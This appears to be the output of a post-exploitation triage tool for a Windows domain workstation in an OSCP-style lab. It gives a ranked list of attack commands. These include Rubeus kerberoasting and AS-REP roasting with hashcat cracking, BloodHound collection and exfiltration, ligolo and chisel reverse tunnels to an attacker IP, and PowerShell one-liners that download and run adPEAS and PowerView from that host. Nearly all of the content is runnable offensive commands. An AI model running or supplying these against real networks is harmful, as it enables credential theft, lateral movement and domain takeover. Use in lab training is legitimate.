  1. HOST
==========================================================================
  computer                   MS01
  user                       OSCP\eric.wallows
  elevated                   no
  os                         Windows 10 Pro  build 19044.2251
  role                       Workstation
  domain                     oscp.exam
  groups                     Remote Management Users
  privileges                 none notable
  dotnet                     4.8 (528372)
  powershell                 5.1.19041.1682
  arch                       AMD64
  av / edr                   none reported / unknown
  local admins               Admin, Administrator, cloudbase-init
  listening                  445/smb 5985/winrm 5986/winrm-ssl
  subnets                    -
  attacker                   192.168.45.158:4444  (all payloads point here)
  folder                     C:\Users\eric.wallows\AppData\Local\Temp

  -- priority 0 (do this first)
  [1] SharpHound   [recon]
      why  Domain-joined: the graph decides every later step. Collect, exfil the ZIP, load it in BloodHound.
      run  .\SharpHound.exe -c All,LoggedOnUsers --zipfilename BH_MS01.zip
  -- priority 1 (high)
  [2] kerberoast   [gain]
      why  One TGS per SPN account, cracked offline. Kali: hashcat -m 13100 kerb.txt rockyou.txt
      run  .\Rubeus.exe kerberoast /outfile:C:\Users\eric.wallows\AppData\Local\Temp\kerb.txt /nowrap /format:hashcat
  -- priority 2 (medium)
  [3] asreproast   [gain]
      why  Accounts without pre-auth hand over an AS-REP you can crack; harmless no-op when none exist.
      run  .\Rubeus.exe asreproast /format:hashcat /outfile:C:\Users\eric.wallows\AppData\Local\Temp\asrep.txt
  [4] ligolo   [gain]
      why  Pivot: this host can reach segments you cannot (internal MS02/DC). Run the agent and route through it.
      run  .\agent.exe -connect 192.168.45.158:11601 -ignore-cert
  [5] chisel   [gain]
      why  Kali: chisel server -p 8001 --reverse (socks5 on 1080). Beats ligolo when only 443/80 egress is allowed.
      run  .\chisel.exe client 192.168.45.158:8001 R:socks
  [6] winPEAS   [recon]
      why  Baseline local privesc: services, ACLs, autologon, unattended files, scheduled tasks.
      run  .\winPEASx64.exe quiet cmd fast
  [7] adPEAS   [recon]
      why  Fills gaps SharpHound leaves: ADCS templates, GPO rights, delegation, unquoted service paths.
      run  IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.158:8888/adPEAS.ps1'); Invoke-adPEAS
  [8] ADCS   [recon]
      why  A vulnerable template mints a certificate for any account you name - ESC1/ESC8 is usually the shortest path to DA.
      run  .\Certify.exe find /vulnerable
  -- priority 3 (triage)
  [9] SharpUp   [recon]
      why  Fast check for unquoted service paths, writable service binaries, weak service ACLs.
      run  .\SharpUp.exe audit
  [10] Seatbelt   [recon]
      why  Host triage: autologon, LAPS, AV, shares, PuTTY keys, browser data, recent files.
      run  .\Seatbelt.exe -group=all -full
  -- priority 4 (if time)
  [11] PowerView   [recon]
      why  Ad-hoc LDAP questions the graph did not answer.
      run  IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.158:8888/PowerView.ps1'); Get-DomainUser -SPN | select samaccountname,serviceprincipalname
